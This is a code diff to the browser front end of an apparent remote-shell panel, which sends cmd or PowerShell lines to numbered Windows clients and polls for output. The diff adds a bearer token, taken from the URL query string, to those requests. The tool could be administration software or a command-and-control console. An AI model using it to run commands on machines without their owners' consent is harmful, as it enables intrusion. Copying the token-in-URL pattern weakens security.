@@ -5,9 +5,16 @@ const params = new URLSearchParams(location.search);
 const clientId = Number(params.get('id'));
 const target   = params.get('host') || `client ${clientId}`;
 const ip       = params.get('ip') || '';
+const token    = params.get('token') || '';
 
 let shell = (params.get('shell') || 'cmd').toLowerCase();
 if (!['cmd', 'powershell'].includes(shell)) shell = 'cmd';
+
+function apiFetch(url, opts = {}) {
+  opts.headers = opts.headers || {};
+  if (token) opts.headers['Authorization'] = `Bearer ${token}`;
+  return fetch(url, opts);
+}
 
 const blocks = new Map();
 let lastSeenId = 0;
@@ -96,7 +103,7 @@ async function send(line) {
   $('term').scrollTop = $('term').scrollHeight;
 
   try {
-    const r = await fetch(`/api/clients/${clientId}/exec`, {
+    const r = await apiFetch(`/api/clients/${clientId}/exec`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ shell, line }),
@@ -121,9 +128,8 @@ async function pollOnce() {
   if (!clientId) return;
   const myGen = pollGen;
   try {
-    const r = await fetch(`/api/clients/${clientId}/commands?t=${Date.now()}`, {
+    const r = await apiFetch(`/api/clients/${clientId}/commands?t=${Date.now()}`, {
       cache: 'no-store',
-      credentials: 'same-origin',
     });
     if (!r.ok) return;
     const rows = await r.json();
